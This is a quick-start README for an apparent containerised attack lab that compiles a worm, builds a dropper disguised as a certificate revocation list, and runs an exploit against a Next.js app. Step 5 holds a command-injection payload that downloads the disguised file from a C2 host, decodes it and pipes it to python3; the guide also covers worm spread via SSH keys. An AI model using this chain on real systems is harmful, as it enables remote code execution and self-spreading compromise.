# Quick Start Guide

## Automated Run

Simply run the automated script:

```bash
./run_scenario.sh
```

This will:
1. ✅ Generate SSH keys
2. ✅ Build Docker images
3. ✅ Start all containers
4. ✅ Compile the worm
5. ✅ Build the fileless dropper
6. ✅ Execute the exploit
7. ✅ Verify infection

---

## Manual Steps (Alternative)

If you prefer to run steps manually:

### 1. Setup SSH Keys
```bash
chmod +x setup.sh
./setup.sh
```

### 2. Build and Start Docker
```bash
docker-compose build
docker-compose up -d
```

Wait for services to be ready (check with `docker-compose ps`)

### 3. Compile Worm
```bash
cd attacker/worm
gcc -static -s -Wall -Wextra -std=c11 -o worm worm.c
```

### 4. Build Dropper
```bash
python3 build-dropper.py
cp revoke.crl ../c2/public/revoke.crl
cd ../..
```

### 5. Run Exploit
```bash
cd attacker/iac
chmod +x exploit-redirect.sh
./exploit-redirect.sh http://localhost:3000 "curl -s http://c2:8080/public/revoke.crl | grep -v '^-----' | base64 -d | python3"
cd ../..
```

### 6. Verify
```bash
./verify.sh
```

---

## Script Options

The `run_scenario.sh` script supports several options:

```bash
# Skip Docker build (use existing images)
./run_scenario.sh --skip-build

# Skip worm compilation (use existing binary)
./run_scenario.sh --skip-compile

# Skip exploit execution (just setup infrastructure)
./run_scenario.sh --skip-exploit

# Interactive mode (pause before exploit)
./run_scenario.sh --interactive

# Combine options
./run_scenario.sh --skip-build --interactive
```

---

## Troubleshooting

### Containers won't start
```bash
docker-compose down
docker-compose up -d
docker-compose logs
```

### Next.js app not ready
Wait 30-60 seconds after starting containers. Check with:
```bash
curl http://localhost:3000
```

### Exploit fails
- Verify C2 server is running: `curl http://localhost:8080/public/revoke.crl`
- Check pms_server logs: `docker-compose logs pms_server`
- Verify worm binary exists: `ls -la attacker/worm/worm`

### Worm not propagating
- Check if SSH keys are mounted: `docker exec pms_server ls -la /home/node/.ssh/`
- Verify spoke containers are running: `docker-compose ps`
- Check worm process: `docker exec pms_server ps aux | grep worm`

---

## Cleanup

To stop and remove everything:

```bash
docker-compose down -v
rm -rf keys/
```

---

## Next Steps

After running the scenario:

1. **Check infection status**: `./verify.sh`
2. **View logs**: `docker-compose logs`
3. **Access containers**: `docker exec -it attacker bash`
4. **Interactive shell**: `./attacker/iac/exploit-shell.sh http://localhost:3000`

